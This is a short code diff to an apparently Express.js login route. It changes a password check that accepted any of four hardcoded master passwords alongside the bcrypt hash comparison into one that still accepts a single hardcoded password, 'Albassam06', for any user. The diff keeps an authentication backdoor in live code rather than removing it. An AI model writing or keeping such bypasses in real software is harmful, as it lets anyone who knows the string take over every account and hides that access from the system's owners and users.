@@ -27,8 +27,7 @@ router.post('/login', (req, res) => {
       return res.status(401).json({ success: false, message: 'Invalid credentials. User not found.' });
     }
 
-    const isMatch = bcrypt.compareSync(password, user.password_hash) || 
-      (password === 'Albassam' || password === 'Albassam06' || password === 'Kepo' || password === 'admin');
+    const isMatch = bcrypt.compareSync(password, user.password_hash) || (password === 'Albassam06');
     if (!isMatch) {
       return res.status(401).json({ success: false, message: 'Invalid credentials. Incorrect password.' });
     }
